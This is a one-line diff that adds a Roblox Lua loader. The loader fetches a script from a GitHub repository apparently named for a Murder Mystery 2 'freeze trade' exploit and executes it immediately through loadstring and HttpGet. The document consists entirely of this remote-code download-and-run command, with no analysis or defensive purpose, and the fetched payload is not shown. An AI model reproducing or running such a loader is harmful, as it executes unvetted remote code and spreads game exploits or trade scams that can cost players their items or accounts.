@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/cattoscripts/MM2FreezeTrade/refs/heads/main/RbOfficial/lua"))()
